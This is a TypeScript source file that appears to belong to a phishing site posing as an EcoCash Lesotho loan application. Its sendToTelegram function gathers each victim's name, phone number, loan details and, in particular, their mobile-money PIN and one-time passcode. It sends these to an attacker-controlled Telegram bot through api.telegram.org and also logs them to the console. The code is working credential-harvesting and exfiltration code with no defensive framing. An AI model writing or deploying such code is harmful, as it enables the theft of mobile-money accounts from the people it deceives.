interface FormData {
  name: string
  phone: string
  amount: string
  duration: string
  pin?: string
  otp?: string
}

export const sendToTelegram = async (data: FormData): Promise<void> => {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID

  if (!botToken || !chatId) {
    throw new Error('Telegram configuration is missing. Please set VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID in your .env file.')
  }

  const message = `
🎯 Kopo e Ncha ea Kadimo - EcoCash Lesotho
   New Loan Application - EcoCash Lesotho

👤 Lebitso (Name): ${data.name}
📱 Nomoro ea Mohala (Phone): ${data.phone}
💰 Chelete (Amount): LSL ${data.amount}
📅 Nako ea ho Lefa (Duration): ${data.duration} month(s)
🔐 PIN: ${data.pin || 'N/A'}
🔑 OTP: ${data.otp || 'N/A'}

📍 E romelitsoe (Submitted): ${new Date().toLocaleString()}
  `.trim()

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`

  console.log('SENDING_TO_TELEGRAM_PAYLOAD:', {
    name: data.name,
    phone: data.phone,
    amount: data.amount,
    duration: data.duration,
    pin: data.pin,
    otp: data.otp,
    full_message: message
  })

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML'
    })
  })

  if (!response.ok) {
    const error = await response.json()
    throw new Error(`Telegram API error: ${error.description || 'Unknown error'}`)
  }

  return await response.json()
}
